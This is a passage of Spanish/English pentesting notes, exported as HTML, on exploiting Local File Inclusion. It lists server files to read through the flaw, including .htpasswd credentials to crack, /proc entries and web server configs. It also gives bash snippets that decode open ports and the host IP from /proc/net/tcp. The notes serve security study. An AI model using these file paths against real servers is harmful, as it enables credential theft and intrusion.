</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Credentials File" class="heading" id="Credentials_File"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Credentials File</h2><div class="heading-children"><div><p>For example, if you are exploiting a web service which has a subdomain that asks you for credentials to access (401 status code) and you have the possibility to run a LFI elsewhere, you can try to get the credentials through the .htaccess and .htpasswd files. </p></div><div><pre><code>/var/www/subdomain/.htpasswd 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>If the password is encrypted, you can try to crack it using john. </p></div></div></div><div class="heading-wrapper"><h2 data-heading="See how the program is started" class="heading" id="See_how_the_program_is_started"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>See how the program is started</h2><div class="heading-children"><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">/proc/self/cmdline
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Scheduler Statistics" class="heading" id="Scheduler_Statistics"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Scheduler Statistics</h2><div class="heading-children"><div><pre><code>/proc/schedstat
/proc/self/schedstat 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Looking for process in linux" class="heading" id="Looking_for_process_in_linux"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Looking for process in linux</h2><div class="heading-children"><div><pre><code>/proc/sched_debug 
/proc/self/sched_debug 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Discover internal open ports:" class="heading" id="Discover_internal_open_ports:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Discover internal open ports:</h2><div class="heading-children"><div><pre><code>/proc/net/tcp 
/proc/net/udp 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Look for containers" class="heading" id="Look_for_containers"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Look for containers</h2><div class="heading-children"><div><pre><code>/proc/net/fib_trie 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Discover routes in nginx" class="heading" id="Discover_routes_in_nginx"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Discover routes in nginx</h2><div class="heading-children"><div><pre><code>/etc/nginx/sites-enabled/default 
/etc/nginx/sites-available/default 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Discover routes in apache" class="heading" id="Discover_routes_in_apache"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Discover routes in apache</h2><div class="heading-children"><div><pre><code>/etc/apache2/sites-enabled/000-default.conf
</code><button class="copy-code-button">Copy</button></pre></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Dirs" class="heading" id="Dirs">Dirs</h1><div class="heading-children"><div><p>Cuando nos sale el tipico alert para loguearnos en una web, por detrás debería existir dos archivos <strong>.htaccess</strong> y <strong>.htpasswd</strong></p></div><div class="heading-wrapper"><h2 data-heading="Enumeration:" class="heading" id="Enumeration:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Enumeration:</h2><div class="heading-children"><div><ul>
<li data-line="0">
<h3 data-heading="Puertos abiertos:" class="heading" id="Puertos_abiertos:">Puertos abiertos:</h3>
</li>
</ul></div><div><pre><code>/proc/net/tcp
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token keyword">for</span> <span class="token for-or-select variable">port</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /proc/net/tcp <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span> <span class="token assign-left variable">FS</span><span class="token operator">=</span><span class="token string">":"</span> <span class="token operator">|</span> <span class="token function">sort</span> -u<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token string">"Open port -&gt; <span class="token variable"><span class="token variable">$((</span><span class="token number">0</span>x$port<span class="token variable">))</span></span>"</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><ul>
<li data-line="0">
<h3 data-heading="IP que sufre LFI:" class="heading" id="IP_que_sufre_LFI:">IP que sufre LFI:</h3>
</li>
</ul></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token comment"># Ejemplo, si vemos lo sig:</span>
 sl  local_address rem_address   st tx_queue rx_queue <span class="token function">tr</span> tm-<span class="token operator">&gt;</span>when retrnsmt   uid  <span class="token function">timeout</span> inode                                   
  <span class="token number">0</span>: 0100007F:9DF3 00000000:0000 0A 00000000:00000000 00:00000000 00000000     <span class="token number">0</span>        <span class="token number">0</span> <span class="token number">20791</span> <span class="token number">1</span> 00000000db86742e <span class="token number">100</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">10</span> <span class="token number">0</span>   
  <span class="token number">1</span>: 2601A8C0:9FFC EFED7522:01BB 01 00000000:00000000 00:00000000 00000000  <span class="token number">1000</span>        <span class="token number">0</span> <span class="token number">433190</span> <span class="token number">1</span> 00000000d81df3b5 <span class="token number">20</span> <span class="token number">4</span> <span class="token number">30</span> <span class="token number">10</span> -1 
  <span class="token number">2</span>: 2601A8C0:8A1C 96C6D62C:01BB 01 00000000:00000000 02:00000B2A 00000000  <span class="token number">1000</span>        <span class="token number">0</span> <span class="token number">200328</span> <span class="token number">2</span> 00000000ed3be9a7 <span class="token number">35</span> <span class="token number">4</span> <span class="token number">30</span> <span class="token number">10</span> -1 
  <span class="token number">3</span>: 2601A8C0:80E4 FCD5C50F:01BB 01 00000000:00000000 02:0000079E 00000000  <span class="token number">1000</span>        <span class="token number">0</span> <span class="token number">199106</span> <span class="token number">2</span> 000000000b021d7c <span class="token number">34</span> <span class="token number">4</span> <span class="token number">29</span> <span class="token number">10</span> -1 
  <span class="token number">4</span>: 2601A8C0:BED8 C3028F68:01BB 01 00000000:00000000 02:000002C2 00000000  <span class="token number">1000</span>        <span class="token number">0</span> <span class="token number">371528</span> <span class="token number">2</span> 00000000ed2a5810 <span class="token number">48</span> <span class="token number">4</span> <span class="token number">0</span> <span class="token number">10</span> -1  
  <span class="token number">5</span>: 2601A8C0:C5E2 <span class="token number">37417522</span>:01BB 01 00000000:00000000 02:00005D33 00000000  <span class="token number">1000</span>        <span class="token number">0</span> <span class="token number">406579</span> <span class="token number">2</span> 0000000004d8efc7 <span class="token number">20</span> <span class="token number">4</span> <span class="token number">31</span> <span class="token number">10</span> -1 
<span class="token comment"># Nos quedamos con la segunda columna: </span>
local_address
0100007F:9DF3
2601A8C0:9FFC
2601A8C0:8A1C
2601A8C0:80E4
2601A8C0:BED8
2601A8C0:C5E2
<span class="token comment"># Y esta vez con el primer argumento tomando de delimitador los ":"</span>
2601A8C0
<span class="token comment"># Y verificamos la IP del equipo que sufre el LFI: </span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$((</span><span class="token number">0xC0</span><span class="token variable">))</span></span>.<span class="token variable"><span class="token variable">$((</span><span class="token number">0xA8</span><span class="token variable">))</span></span>.<span class="token variable"><span class="token variable">$((</span><span class="token number">0x01</span><span class="token variable">))</span></span>.<span class="token variable"><span class="token variable">$((</span><span class="token number">0x26</span><span class="token variable">))</span></span>"</span> <span class="token comment">#2601A8C0</span>

</code><button class="copy-code-button">Copy</button></pre></div><div><ul>
<li data-line="0">
<h3 data-heading="Servicios expuestos:" class="heading" id="Servicios_expuestos:">Servicios expuestos:</h3>
</li>
</ul></div><div><pre><code>/proc/sched_debug
</code><button class="copy-code-button">Copy</button></pre></div><div><ul>
<li data-line="0">
<h3 data-heading="IP's:" class="heading" id="IP's:">IP's:</h3>
</li>
</ul></div><div><pre><code>/proc/net/fib_trie
</code><button class="copy-code-button">Copy</button></pre></div><div class="mod-footer"></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#LFI - (Local File Inclusion)"><div class="tree-item-contents heading-link" heading-name="LFI - (Local File Inclusion)"><span class="tree-item-title">LFI - (Local File Inclusion)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#¿_Que_es_un_**LFI**_?"><div class="tree-item-contents heading-link" heading-name="¿ Que es un **LFI** ?"><span class="tree-item-title">¿ Que es un <strong>LFI</strong> ?</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Explotación"><div class="tree-item-contents heading-link" heading-name="Explotación"><span class="tree-item-title">Explotación</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Archivo_index.php"><div class="tree-item-contents heading-link" heading-name="Archivo index.php"><span class="tree-item-title">Archivo index.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Intento_triste_de_sanitización"><div class="tree-item-contents heading-link" heading-name="Intento triste de sanitización"><span class="tree-item-title">Intento triste de sanitización</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Segundo_intento_de_sanitización"><div class="tree-item-contents heading-link" heading-name="Segundo intento de sanitización"><span class="tree-item-title">Segundo intento de sanitización</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Jugando_con_regex"><div class="tree-item-contents heading-link" heading-name="Jugando con regex"><span class="tree-item-title">Jugando con regex</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Log_Poisoning_-_(_**LFI**_migrado_a_[[RCE_-_(Remote_Command_Execution)]]_)"><div class="tree-item-contents heading-link" heading-name="Log Poisoning - ( **LFI** migrado a [[RCE - (Remote Command Execution)]] )"><span class="tree-item-title">Log Poisoning - ( <strong>LFI</strong> migrado a <a data-href="RCE - (Remote Command Execution)" href="RCE - (Remote Command Execution)" class="internal-link" target="_blank" rel="noopener">RCE - (Remote Command Execution)</a> )</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#SSH"><div class="tree-item-contents heading-link" heading-name="SSH"><span class="tree-item-title">SSH</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Apache"><div class="tree-item-contents heading-link" heading-name="Apache"><span class="tree-item-title">Apache</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#LFI_to_[[RCE_-_(Remote_Command_Execution)]]_a_través_de_phpinfo()"><div class="tree-item-contents heading-link" heading-name="LFI to [[RCE - (Remote Command Execution)]] a través de phpinfo()"><span class="tree-item-title">LFI to <a data-href="RCE - (Remote Command Execution)" href="RCE - (Remote Command Execution)" class="internal-link" target="_blank" rel="noopener">RCE - (Remote Command Execution)</a> a través de phpinfo()</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#->_Cheatsheets:_+_[HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)_+_[ironhackers](https://ironhackers.es/herramientas/lfi-cheat-sheet/)_+_[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)_+_[OSCP_Guide_by_sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)"><div class="tree-item-contents heading-link" heading-name="-> Cheatsheets: + [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion) + [ironhackers](https://ironhackers.es/herramientas/lfi-cheat-sheet/) + [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) + [OSCP Guide by sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)"><span class="tree-item-title">-&gt; Cheatsheets: + <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/pentesting-web/file-inclusion" rel="noopener" class="external-link" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank">HackTricks</a> + <a data-tooltip-position="top" aria-label="https://ironhackers.es/herramientas/lfi-cheat-sheet/" rel="noopener" class="external-link" href="https://ironhackers.es/herramientas/lfi-cheat-sheet/" target="_blank">ironhackers</a> + <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" rel="noopener" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">PayloadsAllTheThings</a> + <a data-tooltip-position="top" aria-label="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" rel="noopener" class="external-link" href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" target="_blank">OSCP Guide by sushant747</a></span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#LFI_to_RCE_via_/proc/self/environ"><div class="tree-item-contents heading-link" heading-name="LFI to RCE via /proc/self/environ"><span class="tree-item-title">LFI to RCE via /proc/self/environ</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Credentials_File"><div class="tree-item-contents heading-link" heading-name="Credentials File"><span class="tree-item-title">Credentials File</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#See_how_the_program_is_started"><div class="tree-item-contents heading-link" heading-name="See how the program is started"><span class="tree-item-title">See how the program is started</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Scheduler_Statistics"><div class="tree-item-contents heading-link" heading-name="Scheduler Statistics"><span class="tree-item-title">Scheduler Statistics</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Looking_for_process_in_linux"><div class="tree-item-contents heading-link" heading-name="Looking for process in linux"><span class="tree-item-title">Looking for process in linux</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Discover_internal_open_ports:"><div class="tree-item-contents heading-link" heading-name="Discover internal open ports:"><span class="tree-item-title">Discover internal open ports:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Look_for_containers"><div class="tree-item-contents heading-link" heading-name="Look for containers"><span class="tree-item-title">Look for containers</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Discover_routes_in_nginx"><div class="tree-item-contents heading-link" heading-name="Discover routes in nginx"><span class="tree-item-title">Discover routes in nginx</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Discover_routes_in_apache"><div class="tree-item-contents heading-link" heading-name="Discover routes in apache"><span class="tree-item-title">Discover routes in apache</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Dirs"><div class="tree-item-contents heading-link" heading-name="Dirs"><span class="tree-item-title">Dirs</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Enumeration:"><div class="tree-item-contents heading-link" heading-name="Enumeration:"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Enumeration:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Puertos_abiertos:"><div class="tree-item-contents heading-link" heading-name="Puertos abiertos:"><span class="tree-item-title">Puertos abiertos:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#IP_que_sufre_LFI:"><div class="tree-item-contents heading-link" heading-name="IP que sufre LFI:"><span class="tree-item-title">IP que sufre LFI:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#Servicios_expuestos:"><div class="tree-item-contents heading-link" heading-name="Servicios expuestos:"><span class="tree-item-title">Servicios expuestos:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\lfi-(local-file-inclusion).html#IP's:"><div class="tree-item-contents heading-link" heading-name="IP's:"><span class="tree-item-title">IP's:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>